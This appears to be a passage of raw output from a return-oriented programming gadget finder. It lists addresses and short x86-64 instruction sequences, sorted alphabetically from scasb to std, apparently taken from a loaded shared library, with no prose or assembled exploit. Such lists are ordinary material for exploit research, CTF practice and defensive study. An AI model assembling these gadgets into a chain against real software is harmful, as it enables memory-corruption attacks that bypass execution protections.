0x00002aaaaac1adb2 : scasb al, byte ptr [rdi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaaba9177 : scasb al, byte ptr [rdi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xf01
0x00002aaaaac7ad7d : scasb al, byte ptr [rdi] ; add byte ptr [rax], al ; loopne 0x1a5d10 ; out dx, al ; call qword ptr [rsi]
0x00002aaaaac7ad7c : scasb al, byte ptr [rdi] ; add byte ptr [rax], al ; loopne 0x1a5d11 ; out dx, al ; call qword ptr [rsi]
0x00002aaaaac7adad : scasb al, byte ptr [rdi] ; add byte ptr [rax], al ; loopne 0x1a5d40 ; out dx, al ; jmp rbx
0x00002aaaaab6282d : scasb al, byte ptr [rdi] ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaac1fdce : scasb al, byte ptr [rdi] ; add eax, 0x83480000 ; ret 0xe910
0x00002aaaaac6a595 : scasb al, byte ptr [rdi] ; cld ; call qword ptr [rsi + 0x26fffcad]
0x00002aaaaac6a555 : scasb al, byte ptr [rdi] ; cld ; push qword ptr [rax + 0x40fffcad] ; lodsd eax, dword ptr [rsi] ; cld ; call rax
0x00002aaaaac5ecc8 : scasb al, byte ptr [rdi] ; jns 0x189cc4 ; jmp qword ptr [rdx]
0x00002aaaaac5ecd0 : scasb al, byte ptr [rdi] ; jns 0x189ccc ; jmp qword ptr [rdx]
0x00002aaaaac5ed6c : scasb al, byte ptr [rdi] ; jns 0x189d68 ; jmp qword ptr [rdx]
0x00002aaaaac5cbac : scasb al, byte ptr [rdi] ; mov ebx, esi ; ljmp ptr [rbp + 0x7c] ; lcall ptr [rsi + rcx*4 - 0xd] ; jmp rdx
0x00002aaaaaad7f94 : scasb al, byte ptr [rdi] ; outsd dx, dword ptr [rsi] ; mov byte ptr [rbx], cl ; and bh, byte ptr [rax - 0x52] ; sub ebx, dword ptr [rsp + rax*2] ; nop ; ret 0x5bdb
0x00002aaaaac486f6 : scasb al, byte ptr [rdi] ; shr edx, -1 ; ret
0x00002aaaaaad7f9a : scasb al, byte ptr [rdi] ; sub ebx, dword ptr [rsp + rax*2] ; nop ; ret 0x5bdb
0x00002aaaaac1fecd : scasd eax, dword ptr [rdi] ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac7aef5 : scasd eax, dword ptr [rdi] ; add byte ptr [rax], al ; mov bh, bh ; stc ; call qword ptr [rax]
0x00002aaaaab505d9 : scasd eax, dword ptr [rdi] ; add dword ptr [rax], 0 ; add bl, ch ; fucomp st(0) ; ret
0x00002aaaaab622cd : scasd eax, dword ptr [rdi] ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaac09113 : scasd eax, dword ptr [rdi] ; add eax, 0x3d8d4800 ; ret
0x00002aaaaac2eb57 : scasd eax, dword ptr [rdi] ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac5cf3d : scasd eax, dword ptr [rdi] ; call qword ptr [rcx]
0x00002aaaaac5cf39 : scasd eax, dword ptr [rdi] ; dec dword ptr [rbp - 0x51] ; call qword ptr [rcx]
0x00002aaaaac75439 : scasd eax, dword ptr [rdi] ; in al, dx ; jmp qword ptr [rcx]
0x00002aaaaabebb23 : scasd eax, dword ptr [rdi] ; jmp 0x76d3a475
0x00002aaaaabebcd6 : scasd eax, dword ptr [rdi] ; jmp 0x76d3a628
0x00002aaaaabed79f : scasd eax, dword ptr [rdi] ; mov eax, edi ; bswap eax ; ret
0x00002aaaaab7193e : scasd eax, dword ptr [rdi] ; or al, byte ptr [rax] ; add bh, dh ; ret 0
0x00002aaaaab0c300 : scasd eax, dword ptr [rdi] ; ret
0x00002aaaaab4907c : scasd eax, dword ptr [rdi] ; ret 0x2948
0x00002aaaaab7ee4e : scasd eax, dword ptr [rdi] ; ret 0x74e9
0x00002aaaaab5b6f8 : scasd eax, dword ptr [rdi] ; ret 0x8948
0x00002aaaaab7ee39 : scasd eax, dword ptr [rdi] ; ret 0xaf0f
0x00002aaaaab0c290 : scasd eax, dword ptr [rdi] ; ret 0xc748
0x00002aaaaab08e54 : scasd eax, dword ptr [rdi] ; ret 0xd231
0x00002aaaaabddb0d : scasd eax, dword ptr [rdi] ; ret 0xf48
0x00002aaaaabde633 : scasd eax, dword ptr [rdi] ; ror dword ptr [rax - 0x3f], -0x16 ; adc byte ptr [rax + 1], cl ; ret 0x3948
0x00002aaaaaad7bcf : scasd eax, dword ptr [rdi] ; xbegin 0xfffffffff8c6efd1 ; ret
0x00002aaaaaad75ac : scasd eax, dword ptr [rdi] ; xchg eax, esi ; add byte ptr [rdx], al ; xchg dh, ch ; ret 0x88ad
0x00002aaaaab5cb90 : scasd eax, dword ptr [rdi] ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac5cf3c : scasq rax, qword ptr [rdi] ; call qword ptr [rcx]
0x00002aaaaabdde15 : seta al ; movzx eax, al ; neg eax ; ret
0x00002aaaaabccf58 : seta al ; movzx edx, dl ; sub eax, edx ; ret
0x00002aaaaabe8ebc : setae al ; ret
0x00002aaaaab9ba08 : setbe al ; movzx eax, al ; pop rbx ; ret
0x00002aaaaabdeaf0 : setbe al ; ret
0x00002aaaaac10768 : sete al ; add rsp, 0x18 ; movzx eax, al ; ret
0x00002aaaaabccd6e : sete al ; add rsp, 0x48 ; movzx eax, al ; ret
0x00002aaaaab1a3b2 : sete al ; add rsp, 8 ; movzx eax, al ; ret
0x00002aaaaabff408 : sete al ; add rsp, 8 ; ret
0x00002aaaaac02aa4 : sete al ; movzx eax, al ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaaba2003 : sete al ; movzx eax, al ; lea rax, qword ptr [rax + rax - 1] ; ret
0x00002aaaaac0eea4 : sete al ; movzx eax, al ; ret
0x00002aaaaab02f35 : sete al ; ret
0x00002aaaaab8f632 : setg al ; movzx eax, al ; lea eax, dword ptr [rax + rax - 1] ; ret
0x00002aaaaaba9fb9 : setg dl ; jmp 0xd4f42
0x00002aaaaab805ca : setl al ; movzx eax, al ; neg eax ; ret
0x00002aaaaac0b26c : setne al ; add rsp, 0x70 ; pop rbx ; ret
0x00002aaaaabd3c13 : setne al ; add rsp, 8 ; movzx eax, al ; ret
0x00002aaaaabbedfb : setne al ; movzx eax, al ; cmova eax, edx ; ret
0x00002aaaaab40349 : setne al ; movzx eax, al ; neg eax ; pop rbx ; ret
0x00002aaaaabbeddd : setne al ; movzx eax, al ; neg eax ; ret
0x00002aaaaabd6984 : setne al ; movzx eax, al ; pop rbx ; ret
0x00002aaaaab0af26 : setne al ; movzx eax, al ; ret
0x00002aaaaac0b16c : setne al ; neg eax ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0b7b7 : setne al ; neg eax ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4805c : setne al ; neg eax ; ret
0x00002aaaaab4c3e8 : setne al ; ret
0x00002aaaaaaf6214 : setne bh ; add rsp, 8 ; mov eax, edi ; neg eax ; ret
0x00002aaaaab8302a : setne dl ; jmp 0xae03a
0x00002aaaaab8594b : setne dl ; jmp 0xb095a
0x00002aaaaab88102 : setne dl ; jmp 0xb311a
0x00002aaaaab6a455 : sgdt ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaabc25f2 : sgdt ptr [rax] ; add byte ptr [rcx - 0x7d], cl ; ret 0x4118
0x00002aaaaaafb553 : sgdt ptr [rax] ; add byte ptr [rcx - 0xa], al ; ret
0x00002aaaaac7c080 : shl bl, 1 ; out dx, eax ; call rsp
0x00002aaaaac69320 : shl byte ptr [rcx - 5], 1 ; jmp qword ptr [rax]
0x00002aaaaac86dc0 : shl byte ptr [rcx], 0xf6 ; jmp qword ptr [rsi]
0x00002aaaaab112c2 : shl byte ptr [rdi + rax*8], 0x22 ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaac7f410 : shl byte ptr [rdx], 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac69b08 : shl byte ptr [rdx], 0xfc ; call qword ptr [rax]
0x00002aaaaac56288 : shl byte ptr [rdx], cl ; jmp 0x18128e
0x00002aaaaab7f124 : shl byte ptr [rip + 0x3fffc00], cl ; div ecx ; pop rbx ; mov eax, eax ; ret
0x00002aaaaab7e6ef : shl byte ptr [rsi + 0x44], 0xf ; out dx, eax ; ret 0xf66
0x00002aaaaab09853 : shl byte ptr [rsi + 0x48], 1 ; movd mm0, eax ; ret
0x00002aaaaab098bc : shl byte ptr [rsi + 0x48], 1 ; movd mm1, eax ; movsd qword ptr [rdi], xmm1 ; ret
0x00002aaaaac44d13 : shl byte ptr [rsi + 0xf], 0xd7 ; ror dword ptr [rcx], cl ; ret 0xe074
0x00002aaaaab5e0f5 : shl byte ptr [rsi + 0xf], 0xeb ; ret 0xf66
0x00002aaaaac43dcb : shl byte ptr [rsi + 0xf], 0xef ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x00002aaaaac43de2 : shl byte ptr [rsi + 0xf], 1 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x00002aaaaab619b6 : shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x00002aaaaab619c7 : shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret 0xf66
0x00002aaaaab73438 : shl byte ptr [rsi + 0xf], 1 ; xlatb ; ret 0xc085
0x00002aaaaac43cc1 : shl byte ptr [rsi + 0xf], cl ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaabd21c1 : shl byte ptr [rsi], 0x64 ; mov dword ptr [rdx], eax ; mov eax, 0xffffffff ; ret
0x00002aaaaab41bb7 : shl dword ptr [rax + 0x63480011], 0x14 ; xchg eax, ecx ; add rcx, rdx ; jmp rcx
0x00002aaaaac52650 : shl dword ptr [rax + rax], 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x00002aaaaabdf1b2 : shl dword ptr [rbx], 0x4e ; adc byte ptr [rax - 0x73], cl ; or al, 0x8e ; add eax, dword ptr [rcx + rdx] ; ret
0x00002aaaaac584ba : shl dword ptr [rdi - 0x3ad6d59f], cl ; fcomp qword ptr [rdi - 0x4a] ; ret 0x474c
0x00002aaaaac58248 : shl dword ptr [rdi - 5], 1 ; ret
0x00002aaaaac43d46 : shl dword ptr [rsi + 0xf], -0x11 ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab7e54b : shl dword ptr [rsi + 0xf], -0x26 ; ret
0x00002aaaaab619b2 : shl dword ptr [rsi + 0xf], -0x29 ; shl byte ptr [rsi + 0xf], 1 ; outsd dx, dword ptr [rsi] ; ret
0x00002aaaaac43dfd : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x2373
0x00002aaaaac43de6 : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x3a73
0x00002aaaaac43dcf : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x5173
0x00002aaaaac4288b : shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac43d61 : shl dword ptr [rsi + 0xf], 1 ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab62d8c : shl dword ptr [rsi + 0xf], 1 ; xlatb ; ret 0xc085
0x00002aaaaab73678 : shl dword ptr [rsi + 0xf], 1 ; xlatb ; ret 0xf188
0x00002aaaaac43c21 : shl dword ptr [rsi + 0xf], cl ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab1aa24 : shl eax, 0x1e ; or eax, edx ; ret
0x00002aaaaab0ffb5 : shl eax, 0xa ; and ecx, 0x3ff ; xor eax, ecx ; ret
0x00002aaaaabf856a : shl eax, 3 ; cdqe ; shr rax, 4 ; ret
0x00002aaaaab0b083 : shl eax, cl ; or qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaab0b103 : shl eax, cl ; test qword ptr [rdi], rax ; setne al ; movzx eax, al ; ret
0x00002aaaaab1da2c : shl ecx, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x00002aaaaab1d9b7 : shl ecx, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x00002aaaaab1d986 : shl ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x00002aaaaab68ee1 : shl ecx, cl ; or r9, r10 ; mov qword ptr [rdi], r9 ; pop rbx ; ret
0x00002aaaaabed818 : shl edi, 0x10 ; movzx eax, si ; or eax, edi ; bswap eax ; ret
0x00002aaaaabdb99f : shl edi, 0x20 ; or eax, edx ; or rax, rsi ; or rax, rdi ; ret
0x00002aaaaaaf58f0 : shl edi, 4 ; add rdi, rbp ; call rax
0x00002aaaaabed809 : shl edi, 8 ; movzx eax, sil ; or eax, edi ; bswap eax ; ret
0x00002aaaaab0f688 : shl edx, 0x20 ; mov rax, rcx ; or rax, rdx ; ret
0x00002aaaaabb942b : shl edx, 2 ; xor esi, esi ; call 0x8e699
0x00002aaaaabf83fb : shl esi, 4 ; lea eax, dword ptr [rsi + 8] ; ret
0x00002aaaaabf859c : shl esi, 4 ; lea rax, qword ptr [rdi + rsi + 8] ; ret
0x00002aaaaab1da2b : shl r9, cl ; mov qword ptr [rdi - 0x10], r9 ; ret
0x00002aaaaab1d9b6 : shl r9, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x00002aaaaab1d985 : shl r9, cl ; mov qword ptr [rdi], r9 ; ret
0x00002aaaaab68ee0 : shl r9, cl ; or r9, r10 ; mov qword ptr [rdi], r9 ; pop rbx ; ret
0x00002aaaaab0b082 : shl rax, cl ; or qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaaaf58ef : shl rdi, 4 ; add rdi, rbp ; call rax
0x00002aaaaab0f687 : shl rdx, 0x20 ; mov rax, rcx ; or rax, rdx ; ret
0x00002aaaaabb942a : shl rdx, 2 ; xor esi, esi ; call 0x8e69a
0x00002aaaaabf859b : shl rsi, 4 ; lea rax, qword ptr [rdi + rsi + 8] ; ret
0x00002aaaaac5c25c : shr ah, 0xf1 ; call rax
0x00002aaaaac5c260 : shr ah, 1 ; int1 ; jmp rax
0x00002aaaaac75889 : shr ah, 1 ; jmp rbx
0x00002aaaaabe6b15 : shr al, 0x65 ; ret
0x00002aaaaabcf0d9 : shr al, 0x71 ; ret
0x00002aaaaabbe64d : shr al, 0x7d ; ret
0x00002aaaaabe6ac3 : shr al, 0xb7 ; ret
0x00002aaaaabe8e36 : shr ax, 0xe ; and eax, 1 ; ret
0x00002aaaaac18221 : shr bl, 0xe5 ; nop dword ptr [rax] ; xor eax, eax ; ret
0x00002aaaaab9c90f : shr bl, cl ; ret
0x00002aaaaab1ca2e : shr bl, cl ; stosb byte ptr [rdi], al ; mov eax, 0xffffffff ; ret
0x00002aaaaac6a754 : shr byte ptr [rbp - 0x52af0004], 0xfc ; jmp rax
0x00002aaaaab91a3e : shr byte ptr [rbx + 7], 0 ; add byte ptr [rax + 1], cl ; ret 0x8d48
0x00002aaaaab9667f : shr byte ptr [rcx - 0x40], 1 ; nop ; add dword ptr [rax], eax ; add byte ptr [rcx], ch ; ret
0x00002aaaaac6a57c : shr byte ptr [rcx - 0x56af0004], 0xfc ; jmp rax
0x00002aaaaab73c5f : shr byte ptr [rcx], 0xc8 ; ret
0x00002aaaaac7a310 : shr byte ptr [rcx], 0xee ; jmp qword ptr [rdi]
0x00002aaaaab8e39f : shr byte ptr [rcx], 1 ; ret
0x00002aaaaaafeae8 : shr byte ptr [rcx], cl ; ret
0x00002aaaaab6313b : shr byte ptr [rcx], cl ; rol bl, 1 ; nop ; xor eax, eax ; ret
0x00002aaaaabccf5d : shr byte ptr [rcx], cl ; sal bl, 1 ; ret
0x00002aaaaac5cf30 : shr byte ptr [rdx - 0x5586000d], 0xf3 ; jmp qword ptr [rdi]
0x00002aaaaabbbf14 : shr byte ptr [rip + 0x28b4800], 0x48 ; mov dword ptr [rdx], edi ; ret
0x00002aaaaac5c00c : shr byte ptr [rsi - 0xf], 0xff ; shr byte ptr [rsi - 0xf], 1 ; jmp rax
0x00002aaaaac5c010 : shr byte ptr [rsi - 0xf], 1 ; jmp rax
0x00002aaaaac6bbd1 : shr ch, 1 ; call rsp
0x00002aaaaac5c290 : shr ch, 1 ; int1 ; push rax ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaab19ac0 : shr cl, cl ; ret
0x00002aaaaac5c2d0 : shr dh, 0xf1 ; call rax
0x00002aaaaac5c2d4 : shr dh, 1 ; int1 ; jmp rax
0x00002aaaaac487b5 : shr dl, 0xff ; cmp rbx, rbp ; jb 0x1737b7 ; pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaac48882 : shr dl, 0xff ; nop dword ptr [rax] ; add rsp, 8 ; ret
0x00002aaaaac44d5e : shr dword ptr [rax - 0x267af0e0], 1 ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x00002aaaaab9b4d0 : shr dword ptr [rcx], 1 ; ret
0x00002aaaaabed848 : shr eax, 0x18 ; ret
0x00002aaaaab09b91 : shr eax, 0x1f ; ret
0x00002aaaaac44c8c : shr eax, 0x20 ; cmp ecx, eax ; jne 0x16fc9f ; xor eax, eax ; ret
0x00002aaaaab1f213 : shr eax, 0x20 ; mov dword ptr [rsp - 0x14], eax ; fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaab097c0 : shr eax, 0x3f ; ret
0x00002aaaaabdb978 : shr eax, 0xc ; xor al, al ; or eax, edi ; ret
0x00002aaaaab7f06a : shr eax, 0xe ; and eax, 0x3fc00 ; pop rbx ; ret
0x00002aaaaabe8e37 : shr eax, 0xe ; and eax, 1 ; ret
0x00002aaaaabab705 : shr eax, 3 ; and eax, 1 ; pop rbx ; ret
0x00002aaaaab4cf02 : shr eax, 4 ; and eax, 1 ; ret
0x00002aaaaabf8570 : shr eax, 4 ; ret
0x00002aaaaab4cf12 : shr eax, 5 ; and eax, 1 ; ret
0x00002aaaaab7f049 : shr eax, 6 ; and eax, 0x3fffc00 ; pop rbx ; ret
0x00002aaaaab0af3f : shr eax, 6 ; or qword ptr [rdi + rax*8], rdx ; xor eax, eax ; ret
0x00002aaaaabde88b : shr eax, cl ; and eax, 1 ; ret
0x00002aaaaac6bc09 : shr ebp, cl ; dec esp ; rol dword ptr [rax], 0 ; and al, 0xd4 ; in eax, dx ; jmp rsp
0x00002aaaaabe4f9c : shr ecx, 0x1f ; sub eax, edx ; cmp dil, cl ; cmovne eax, esi ; ret
0x00002aaaaac173f1 : shr ecx, 3 ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
0x00002aaaaab0af97 : shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; ret
0x00002aaaaab1db3c : shr ecx, cl ; mov qword ptr [rdi + 0x10], r9 ; ret
0x00002aaaaab1dac1 : shr ecx, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x00002aaaaab1da90 : shr ecx, cl ; mov qword ptr [rdi], r9 ; ret
0x00002aaaaab9ec06 : shr ecx, cl ; ret
0x00002aaaaac486f7 : shr edx, -1 ; ret
0x00002aaaaab47e73 : shr edx, 2 ; sub eax, edx ; ret
0x00002aaaaac10b0a : shr edx, 3 ; add rax, rcx ; jmp rax
0x00002aaaaab4a9b0 : shr edx, 4 ; and edx, 1 ; mov eax, edx ; ret
0x00002aaaaab4aaa0 : shr edx, 5 ; and edx, 1 ; mov eax, edx ; ret
0x00002aaaaab02a79 : shr edx, cl ; cmp edx, dword ptr [rdi + 4] ; jb 0x2da90 ; ret
0x00002aaaaabf801b : shr esi, 3 ; sub esi, 1 ; mov byte ptr [rdi + 1], sil ; ret
0x00002aaaaab1db3b : shr r9, cl ; mov qword ptr [rdi + 0x10], r9 ; ret
0x00002aaaaab1dac0 : shr r9, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x00002aaaaab1da8f : shr r9, cl ; mov qword ptr [rdi], r9 ; ret
0x00002aaaaac44c8b : shr rax, 0x20 ; cmp ecx, eax ; jne 0x16fca0 ; xor eax, eax ; ret
0x00002aaaaab097bf : shr rax, 0x3f ; ret
0x00002aaaaabdb977 : shr rax, 0xc ; xor al, al ; or eax, edi ; ret
0x00002aaaaabf856f : shr rax, 4 ; ret
0x00002aaaaab0af3e : shr rax, 6 ; or qword ptr [rdi + rax*8], rdx ; xor eax, eax ; ret
0x00002aaaaab47e72 : shr rdx, 2 ; sub eax, edx ; ret
0x00002aaaaac10b09 : shr rdx, 3 ; add rax, rcx ; jmp rax
0x00002aaaaab72ee1 : shufps xmm0, xmmword ptr [rdi + 4], 0 ; lea rax, qword ptr [rdi + 4] ; ret
0x00002aaaaab72e51 : shufps xmm0, xmmword ptr [rdi + 4], 0 ; mov rax, rdi ; ret
0x00002aaaaab6db5e : sldt word ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab7017c : sldt word ptr [rax] ; add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaac51821 : sldt word ptr [rax] ; mov ebp, 0xc000000f ; sldt word ptr [rax] ; ret
0x00002aaaaabdb963 : sldt word ptr [rax] ; or eax, edi ; ret
0x00002aaaaac51829 : sldt word ptr [rax] ; ret
0x00002aaaaaad866b : sqrtps xmm5, xmmword ptr [rsi - 0x56] ; stc ; insb byte ptr [rdi], dx ; mov ebx, 0x952a6c41 ; ret
0x00002aaaaabb5411 : stc ; adc dword ptr [rsi + rsi + 0x48], esi ; mov edx, eax ; jmp 0xe03b5
0x00002aaaaac0276b : stc ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaabf8041 : stc ; add dword ptr [rbx - 0x77], edx ; ror dword ptr [rdi], cl ; xchg eax, esi ; ret 0xfb83
0x00002aaaaabc9f9e : stc ; add ecx, 0x50 ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; ret
0x00002aaaaabfbc7c : stc ; and ecx, dword ptr [rdi] ; xchg eax, ebp ; ret 0xf980
0x00002aaaaac7aefa : stc ; call qword ptr [rax]
0x00002aaaaac6f1e2 : stc ; call qword ptr [rdi + rbx + 2]
0x00002aaaaab81d6e : stc ; call rbx
0x00002aaaaac6ee22 : stc ; call rsp
0x00002aaaaabe2261 : stc ; cmp cl, byte ptr [rdi] ; ret 0xc084
0x00002aaaaabff012 : stc ; cmp cl, byte ptr [rdi] ; xchg eax, ebp ; ret 0x8041
0x00002aaaaabcd4cc : stc ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaab5c7c6 : stc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaabc7942 : stc ; dec dword ptr [rax - 0x77] ; ret 0x3145
0x00002aaaaabc8f83 : stc ; dec dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x84 ; ret 0xa
0x00002aaaaab5db0f : stc ; dec dword ptr [rax - 0x7b] ; sal byte ptr [rax + rbp + 0x48], 0x89 ; ret 0x8948
0x00002aaaaabcd332 : stc ; dec dword ptr [rbp + rcx*4 + 0x24] ; sub byte ptr [rax - 0x77], cl ; ret 0x8d49
0x00002aaaaabcda12 : stc ; dec dword ptr [rcx - 0x73] ; push rsi ; add dword ptr [rax + 0x39], ecx ; ret 0xc72
0x00002aaaaabf693b : stc ; dec dword ptr [rdi] ; test byte ptr [rsp + rax - 0x7cb80000], ch ; ret 0x4104
0x00002aaaaac6f262 : stc ; inc dword ptr [rdx - 0x366bfffe] ; stc ; call rsp
0x00002aaaaac6f0ca : stc ; inc dword ptr [rsi + rdx - 0x78bbfffe] ; stc ; call rsp
0x00002aaaaaad866f : stc ; insb byte ptr [rdi], dx ; mov ebx, 0x952a6c41 ; ret
0x00002aaaaac7e989 : stc ; int1 ; call rsi
0x00002aaaaac1ee82 : stc ; je 0x149e4e ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac20512 : stc ; je 0x14b4de ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac86eca : stc ; jmp qword ptr [rsi]
0x00002aaaaab0829d : stc ; jmp rcx
0x00002aaaaac6ee42 : stc ; jmp rsp
0x00002aaaaac580c4 : stc ; jnp 0x183083 ; ret
0x00002aaaaac6f2a2 : stc ; lcall ptr [rsp - 0x2efbfffe] ; stc ; call rsp
0x00002aaaaac6f0e2 : stc ; ljmp ptr [rdi + rdx + 2] ; add ah, dl ; mov bh, cl ; call rsp
0x00002aaaaac27ba8 : stc ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac27ba2 : stc ; mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaabfbf02 : stc ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab72dcb : stc ; mov rax, rdi ; ret
0x00002aaaaab3f913 : stc ; pop rax ; add byte ptr [rax], al ; add rsp, 0xd8 ; ret
0x00002aaaaab1d6da : stc ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaac6ee3a : stc ; push qword ptr [rax + rax + 0x3bf40002] ; stc ; jmp rsp
0x00002aaaaab1db7d : stc ; push qword ptr [rbp - 0x11] ; mov rax, rdx ; ret
0x00002aaaaac6ef0a : stc ; push qword ptr [rdx + rcx + 0x52240002] ; stc ; call rsp
0x00002aaaaab7ea39 : stc ; salc ; clc ; ret
0x00002aaaaabde88a : stc ; shr eax, cl ; and eax, 1 ; ret
0x00002aaaaac69985 : stc ; sti ; jmp qword ptr [rax]
0x00002aaaaab0af93 : stc ; sub ecx, -0x80 ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; ret
0x00002aaaaab74434 : stc ; vmovups zmmword ptr [rdi - 0x200], zmm15 ; ret
0x00002aaaaab5f845 : stc ; xor byte ptr [rdi], cl ; xchg eax, esp ; ret 0xf201
0x00002aaaaab58562 : stc ; xor eax, dword ptr [rax] ; mov qword ptr [rax], rdi ; ret
0x00002aaaaab1b075 : std ; add al, byte ptr [rax] ; add byte ptr [rcx + 0x39], cl ; ret 0xea75
0x00002aaaaaba1dde : std ; add byte ptr [rax], al ; jne 0xccdb1 ; ret
0x00002aaaaabbc272 : std ; add byte ptr [rcx], bh ; ret
0x00002aaaaac8fd25 : std ; add dword ptr [rax], eax ; push rsp ; clc ; jmp qword ptr [rcx]
0x00002aaaaab218ac : std ; add eax, 0xf8834800 ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac6949e : std ; call qword ptr [rax + 0x10fffda3]
0x00002aaaaac694a6 : std ; call qword ptr [rax + 0x10fffda4]
0x00002aaaaac694ae : std ; call qword ptr [rax + 0x10fffda5]
0x00002aaaaac6949a : std ; call qword ptr [rax - 0x6f00025e]
0x00002aaaaac694a2 : std ; call qword ptr [rax]
0x00002aaaaac694de : std ; call qword ptr [rcx - 0x2e00024b]
0x00002aaaaac693d2 : std ; call qword ptr [rcx]
0x00002aaaaac694d2 : std ; call rcx
0x00002aaaaac69436 : std ; call rsi
0x00002aaaaac6fdaa : std ; call rsp
0x00002aaaaabca851 : std ; dec dword ptr [rax - 0x39] ; ret 0xffff
0x00002aaaaac46f79 : std ; dec dword ptr [rax - 0x77] ; out dx, eax ; add rdi, qword ptr [r13 + 0x10] ; call r12
0x00002aaaaac02c49 : std ; dec dword ptr [rax - 0x77] ; ret 0xffb8
0x00002aaaaab4ba47 : std ; dec dword ptr [rax - 0x7f] ; ret
0x00002aaaaac5c0fa : std ; dec dword ptr [rax] ; ret 0xfffd
0x00002aaaaab3d466 : std ; dec dword ptr [rdi] ; test byte ptr [rax + rax - 0x7cb80000], ah ; ret
0x00002aaaaac6fda2 : std ; dec esp ; adc eax, 0x77440001 ; std ; call rsp
0x00002aaaaab0a05d : std ; fstp st(1) ; ret
0x00002aaaaac837a9 : std ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab4b76f : std ; imul edi, ebp, 0x89c085ff ; ret
0x00002aaaaac694fe : std ; inc dword ptr [rax - 0x2e00024b] ; mov bh, 0xfd ; call rcx
0x00002aaaaac69406 : std ; inc dword ptr [rcx - 0x57] ; std ; jmp rcx
0x00002aaaaac6958e : std ; inc dword ptr [rdi - 0x49] ; std ; call rcx
0x00002aaaaac69432 : std ; inc dword ptr [rsi - 0x5a] ; std ; call rsi
0x00002aaaaac6942e : std ; inc esi ; movsd dword ptr [rdi], dword ptr [rsi] ; std ; inc dword ptr [rsi - 0x5a] ; std ; call rsi
0x00002aaaaac5c3ad : std ; int1 ; call rax
0x00002aaaaac5c3b5 : std ; int1 ; jmp qword ptr [rax]
0x00002aaaaac5c3b1 : std ; int1 ; push rax ; std ; int1 ; jmp qword ptr [rax]
0x00002aaaaac485cf : std ; ja 0x17359d ; call 0x1f8ad
0x00002aaaaac695fe : std ; jmp qword ptr [rax - 0x2e00024a]
0x00002aaaaac695de : std ; jmp qword ptr [rax - 0x2e00024b]
0x00002aaaaac693ca : std ; jmp qword ptr [rax]
0x00002aaaaac69402 : std ; jmp qword ptr [rcx + 0x41fffda8]
0x00002aaaaac710d2 : std ; jmp qword ptr [rdi]
